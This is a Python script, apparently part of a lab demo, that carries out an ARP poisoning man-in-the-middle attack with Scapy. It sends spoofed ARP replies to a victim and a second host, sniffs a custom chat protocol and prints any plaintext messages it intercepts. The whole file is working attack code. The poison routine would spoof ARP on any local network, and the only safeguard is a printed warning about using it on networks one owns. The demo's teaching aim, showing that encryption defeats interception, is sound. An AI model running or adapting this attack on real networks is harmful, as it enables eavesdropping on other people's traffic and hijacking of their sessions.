#!/usr/bin/env python3
"""
STEP 2: ARP Poisoning Attack

Run this on Laptop C (Attacker) to intercept traffic between Laptops A and B.

Usage:
    sudo python scripts/2_attacker.py -i <interface> -v <victim_ip> -g <gateway_or_other_ip>
    
Example:
    sudo python scripts/2_attacker.py -i en0 -v 192.168.1.10 -g 192.168.1.20

This script:
1. Sends fake ARP replies to the victim saying "I am the gateway"
2. Sends fake ARP replies to the gateway saying "I am the victim"
3. Intercepts and forwards traffic between them (MITM)
4. Displays intercepted ARP Chat messages (encrypted vs plaintext)
"""

import sys
import argparse
import time
import signal
import threading
from datetime import datetime

sys.path.insert(0, '.')

try:
    from scapy.all import (
        Ether, ARP, Raw, sendp, send, srp, getmacbyip,
        get_if_hwaddr, sniff, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    print("ERROR: Scapy not installed. Run: pip install scapy")
    sys.exit(1)

from core.network_utils import get_interface_info, get_mac_address


class ARPAttacker:
    """ARP Poisoning Attack for demo."""
    
    ETHER_TYPE = 0x88b5  # ARP Chat EtherType
    
    def __init__(self, interface: str, victim_ip: str, target_ip: str, intercept: bool = True):
        self.interface = interface
        self.victim_ip = victim_ip
        self.target_ip = target_ip
        self.running = False
        self.packets_sent = 0
        self.packets_intercepted = 0
        self.messages_intercepted = 0
        self.encrypted_count = 0
        self.plaintext_count = 0
        self.intercept_enabled = intercept
        
        # Get our info
        info = get_interface_info(interface)
        if not info:
            raise ValueError(f"Cannot get info for interface {interface}")
        self.our_mac = info.mac
        self.our_ip = info.ip
        
        # Get victim's real MAC
        self.victim_mac = get_mac_address(victim_ip, interface)
        if not self.victim_mac:
            raise ValueError(f"Cannot resolve MAC for victim {victim_ip}")
            
        # Get target's real MAC
        self.target_mac = get_mac_address(target_ip, interface)
        if not self.target_mac:
            raise ValueError(f"Cannot resolve MAC for target {target_ip}")
            
        print(f"\n{'='*60}")
        print(f"  ARP POISONING ATTACK")
        print(f"{'='*60}")
        print(f"  Interface:    {interface}")
        print(f"  Attacker IP:  {self.our_ip}")
        print(f"  Attacker MAC: {self.our_mac}")
        print(f"  ")
        print(f"  Victim IP:    {victim_ip}")
        print(f"  Victim MAC:   {self.victim_mac}")
        print(f"  ")
        print(f"  Target IP:    {target_ip}")
        print(f"  Target MAC:   {self.target_mac}")
        print(f"  ")
        print(f"  Intercept:    {'🕵️ ENABLED' if intercept else 'DISABLED'}")
        print(f"{'='*60}")
        print(f"\n  ⚠️  WARNING: Only use on networks you own!")
        print(f"{'='*60}\n")
        
    def packet_handler(self, packet):
        """Handle intercepted packets and display chat messages."""
        if packet.haslayer(Ether) and packet[Ether].type == self.ETHER_TYPE:
            if packet.haslayer(Raw):
                try:
                    data = packet[Raw].load.decode()
                    self.messages_intercepted += 1
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    
                    # Check for encrypted messages
                    if data.startswith("ARPCHAT_ENC|"):
                        self.encrypted_count += 1
                        parts = data.split("|", 2)
                        if len(parts) >= 3:
                            sender_ip = parts[1]
                            encrypted_msg = parts[2]
                            print(f"\n[{timestamp}] 🔒 ENCRYPTED MESSAGE INTERCEPTED:")
                            print(f"    From: {sender_ip}")
                            print(f"    Content: [ENCRYPTED - CANNOT READ]")
                            print(f"    Raw: {encrypted_msg[:50]}...")
                            print(f"    Status: 🛡️ PROTECTED - Encryption defeats interception!")
                    
                    # Check for plaintext messages
                    elif data.startswith("ARPCHAT|"):
                        self.plaintext_count += 1
                        parts = data.split("|", 2)
                        if len(parts) >= 3:
                            sender_ip = parts[1]
                            message = parts[2]
                            print(f"\n[{timestamp}] 🚨 PLAINTEXT MESSAGE INTERCEPTED:")
                            print(f"    From: {sender_ip}")
                            print(f"    Content: {message}")
                            print(f"    Status: ⚠️ VULNERABLE - Message exposed!")
                except:
                    pass
        
    def poison(self):
        """Send poisoned ARP packets to both victim and target."""
        # Tell victim: "I am target" (send our MAC for target's IP)
        victim_packet = Ether(dst=self.victim_mac, src=self.our_mac) / ARP(
            op=2,  # ARP Reply
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.target_ip,  # Claim to be target
            hwsrc=self.our_mac    # But use our MAC
        )
        
        # Tell target: "I am victim" (send our MAC for victim's IP)
        target_packet = Ether(dst=self.target_mac, src=self.our_mac) / ARP(
            op=2,  # ARP Reply
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.victim_ip,  # Claim to be victim
            hwsrc=self.our_mac    # But use our MAC
        )
        
        sendp(victim_packet, iface=self.interface, verbose=False)
        sendp(target_packet, iface=self.interface, verbose=False)
        self.packets_sent += 2
        
    def restore(self):
        """Restore original ARP entries."""
        print("\n[*] Restoring ARP tables...")
        
        # Tell victim the real target MAC
        restore_victim = Ether(dst=self.victim_mac, src=self.target_mac) / ARP(
            op=2,
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac
        )
        
        # Tell target the real victim MAC
        restore_target = Ether(dst=self.target_mac, src=self.victim_mac) / ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.victim_ip,
            hwsrc=self.victim_mac
        )
        
        for _ in range(5):
            sendp(restore_victim, iface=self.interface, verbose=False)
            sendp(restore_target, iface=self.interface, verbose=False)
            time.sleep(0.5)
            
        print("[✓] ARP tables restored")
        
    def start(self, interval: float = 2.0):
        """Start the attack."""
        self.running = True
        print("[*] Starting ARP poisoning attack...")
        print(f"[*] Sending poison packets every {interval} seconds")
        if self.intercept_enabled:
            print("[*] Sniffing for ARP Chat messages...")
        print("[*] Press Ctrl+C to stop and restore ARP tables\n")
        
        # Start sniffer thread if interception is enabled
        if self.intercept_enabled:
            sniffer_thread = threading.Thread(target=self._sniff_packets, daemon=True)
            sniffer_thread.start()
        
        try:
            while self.running:
                self.poison()
                timestamp = datetime.now().strftime("%H:%M:%S")
                status = f"Poisoned: {self.packets_sent}"
                if self.intercept_enabled:
                    status += f" | Intercepted: {self.messages_intercepted} (🔒{self.encrypted_count} / ⚠️{self.plaintext_count})"
                print(f"[{timestamp}] {status}")
                time.sleep(interval)
        except KeyboardInterrupt:
            self.running = False
            
        self.restore()
        print(f"\n[*] Attack complete.")
        print(f"    Poison packets sent: {self.packets_sent}")
        if self.intercept_enabled:
            print(f"    Messages intercepted: {self.messages_intercepted}")
            print(f"    - Encrypted (protected): {self.encrypted_count}")
            print(f"    - Plaintext (exposed):   {self.plaintext_count}")
    
    def _sniff_packets(self):
        """Background thread to sniff for ARP Chat packets."""
        try:
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                filter=f"ether proto {hex(self.ETHER_TYPE)}",
                store=False,
                stop_filter=lambda _: not self.running
            )
        except:
            pass


def main():
    parser = argparse.ArgumentParser(description="ARP Poisoning Attack")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
    parser.add_argument("-g", "--target", required=True, help="Target IP (gateway or other host)")
    parser.add_argument("--interval", type=float, default=2.0, help="Poison interval (seconds)")
    parser.add_argument("--no-intercept", action="store_true", help="Disable chat interception")
    args = parser.parse_args()
    
    attacker = ARPAttacker(args.interface, args.victim, args.target, not args.no_intercept)
    attacker.start(args.interval)


if __name__ == "__main__":
    main()
